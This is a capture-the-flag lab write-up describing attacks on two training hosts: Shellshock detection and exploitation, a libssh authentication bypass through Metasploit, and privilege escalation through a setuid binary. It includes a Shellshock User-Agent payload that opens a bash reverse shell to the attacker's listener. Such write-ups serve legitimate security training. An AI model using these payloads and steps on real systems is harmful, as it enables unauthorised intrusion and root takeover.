# 1. Host & Network Penetration Testing: System-Host Based Attacks CTF 2


### Objective
 Perform system/host-based attacks on the target and capture all the flags hidden within the environment

### Skills Learned
- Perform system/host-based attacks on Linux  targets and identify hidden information on a target machine

### Tools Used

- Nmap
- Burp Suite
- Metasploit Framework

### Flags to Capture:
- Flag 1: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
- Flag 2: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
- Flag 3: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
- Flag 4: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

### Steps

First let's run a nmap scan to detect the service running on the target.

<img width="803" height="258" alt="Screenshot 2026-02-05 at 11 48 11 PM" src="https://github.com/user-attachments/assets/8782782e-edef-40bd-909c-e2107f1279ba" />

Port 80 is running an apache server, let's open the web page. 

<img width="1680" height="825" alt="Screenshot 2026-02-05 at 11 51 14 PM" src="https://github.com/user-attachments/assets/949ce95e-459d-4fa4-a7d2-030b2718be9c" />

From the URL, we can detect that's using CGI script. Now, let's validate if the target is vulnerable to Shell Shock attack with an nmap script using the following command `nmap -sV target1.ine.local --script=http-shellshock --script-args "http-shellshock.uri=/browser.cgi" `

<img width="897" height="461" alt="Screenshot 2026-02-05 at 11 55 30 PM" src="https://github.com/user-attachments/assets/5c6e4e64-bafb-40c9-af8d-a9d3bde51fff" />

As an output, you can see that's vulnerable and it even provides the CVE. This means we can utilize CGI script and inject special characters within http headers in the user agent

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((Unix))
|_http-server-header: Apache/2.4.6 (Unix)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
```
I'm going to use the header proxy and Burpsuite to make the injection 

<img width="1674" height="793" alt="Screenshot 2026-02-05 at 11 58 44 PM" src="https://github.com/user-attachments/assets/782a9c80-346e-40d5-8a8d-89b08db0ab01" />

Here, I checked that the intercept is on, and then I reload the web page. That information will be sent to the repeater

<img width="1397" height="790" alt="Screenshot 2026-02-05 at 11 59 52 PM" src="https://github.com/user-attachments/assets/4ffbd867-5a7a-4a80-844c-4958a4395efc" />

<img width="1395" height="785" alt="Screenshot 2026-02-06 at 12 00 57 AM" src="https://github.com/user-attachments/assets/6c7992f3-2f21-4662-bf75-4854e3c8d7dd" />

On the Repeater tab, I'll get rid of the User-Agent information and replace that with the `() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/(localip)/(port) 0>&1'` and in the root session I'll open a netcat listener

<img width="1592" height="856" alt="Screenshot 2026-02-06 at 12 15 50 AM" src="https://github.com/user-attachments/assets/ac60c71f-9677-4887-8a91-e928f7090f28" />

<img width="687" height="141" alt="Screenshot 2026-02-06 at 12 16 04 AM" src="https://github.com/user-attachments/assets/2195dc23-41e8-41d3-9c80-33af126a3e82" />

Now, that I have gained access, I'll position myself in `\` and look for the Flag 1

<img width="490" height="512" alt="Screenshot 2026-02-06 at 12 20 08 AM" src="https://github.com/user-attachments/assets/88230f26-9eff-422e-a965-7ecb1f801917" />

The second flag is under the same host, let's move to `/opt/apache/htdocs/` 

<img width="496" height="438" alt="Screenshot 2026-02-06 at 12 22 36 AM" src="https://github.com/user-attachments/assets/4973d902-9572-4365-af9c-00b6c0903f4e" />

Once there, I'll check the content and cat the flag. To list hidden files, use the command `ls -la`

<img width="573" height="216" alt="Screenshot 2026-02-06 at 12 24 17 AM" src="https://github.com/user-attachments/assets/21b9508a-e0a4-4f39-94f7-d3da4c2ff52f" />

We have discovered the hidden file and the Flag 2.

For the next flag, we will work with the other target. And Firstly, a nmap scan will be run 

<img width="860" height="330" alt="Screenshot 2026-02-06 at 12 32 39 AM" src="https://github.com/user-attachments/assets/e0accaef-a345-4376-b5cd-1dd5e75848b8" />

From that scan, we can tell that the port 22 is open and running the service  libssh 0.8.3. Therefore, We'll look for a exploit on Metasploit.

<img width="1130" height="283" alt="Screenshot 2026-02-06 at 12 35 15 AM" src="https://github.com/user-attachments/assets/02e525a2-de32-48cd-9850-a36f138ab66e" />

<img width="1334" height="425" alt="Screenshot 2026-02-06 at 12 39 29 AM" src="https://github.com/user-attachments/assets/8f5ef36d-cb2d-4a07-ac98-e77b5cff02ec" />

Change parameters: `set RHOST target2.ine.local` and `set SPAWN_PTY yes` 

<img width="986" height="143" alt="Screenshot 2026-02-06 at 12 40 40 AM" src="https://github.com/user-attachments/assets/0fda3c14-c914-4f7e-a317-fe0f43f4867e" />

Now we can check the session that was opened with the command `sessions`

<img width="1668" height="183" alt="Screenshot 2026-02-06 at 12 43 23 AM" src="https://github.com/user-attachments/assets/0f261bce-15c0-4e1b-82c4-00be79cd5f46" />

Now, in order to get access to the shell: `sessions -i 3` Now, let's go to the  home directory 

<img width="595" height="171" alt="Screenshot 2026-02-06 at 12 46 37 AM" src="https://github.com/user-attachments/assets/dd045a0b-4f4e-48c4-b12e-80dcd1e8243f" />

We have obtained the third flag. For the 4th flag we have to go to the /root directory

<img width="454" height="54" alt="Screenshot 2026-02-06 at 12 48 26 AM" src="https://github.com/user-attachments/assets/be8737c9-944c-42a8-a843-260c4ff86a96" />

We were not able to access root due to the permissions of the folder. We will elevate our privileges

<img width="568" height="344" alt="Screenshot 2026-02-06 at 12 48 55 AM" src="https://github.com/user-attachments/assets/fe6b34f3-11bc-47e1-a9a6-be9b54f5b869" />

In users directory, we find two files called `greetings` and `welcome`. Let's validate if those files are binary. 

<img width="500" height="178" alt="Screenshot 2026-02-06 at 12 52 35 AM" src="https://github.com/user-attachments/assets/ab08576e-de64-4433-8802-33cbc850ab10" />

Let's run the files, we have access to welcome, but not greetings 
<img width="443" height="124" alt="Screenshot 2026-02-06 at 12 54 21 AM" src="https://github.com/user-attachments/assets/b6f0b5a5-ec97-4654-bf0d-8c82e0f7a001" />

Now let's verify the type of file

```
sh-5.2$ file welcome 
file welcome 
welcome: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=199bc8fd6e66e29f770cdc90ece1b95484f34fca, not stripped
```
if we run the strings command to check functions within the `welcome` binary file, we can see the `greetings` binary on it. Therefore, we'll remove this greetings file and create a new one, the new file will help us esclate our privileges

<img width="735" height="500" alt="Screenshot 2026-02-06 at 12 56 51 AM" src="https://github.com/user-attachments/assets/02762352-5646-4247-97c6-9f0b5eb3a139" />

The payload for the new `greetings` file is /bin/bash

<img width="754" height="175" alt="Screenshot 2026-02-06 at 1 00 00 AM" src="https://github.com/user-attachments/assets/4772a7e8-169e-487f-84ec-037ec0b2c787" />

Now, let's verify by running the welcome binary

<img width="330" height="63" alt="Screenshot 2026-02-06 at 1 00 42 AM" src="https://github.com/user-attachments/assets/771bc3b1-943f-4239-95b8-01788ed4e8ce" />

And now, we have the Flag 4!

<img width="1673" height="888" alt="Screenshot 2026-02-06 at 1 02 32 AM" src="https://github.com/user-attachments/assets/ae4ca4b6-ed10-4039-a6fb-ac41b328fa67" />


<img width="703" height="356" alt="Screenshot 2026-02-06 at 1 01 57 AM" src="https://github.com/user-attachments/assets/450b1508-1533-4f2b-afbb-8f23d89af979" />


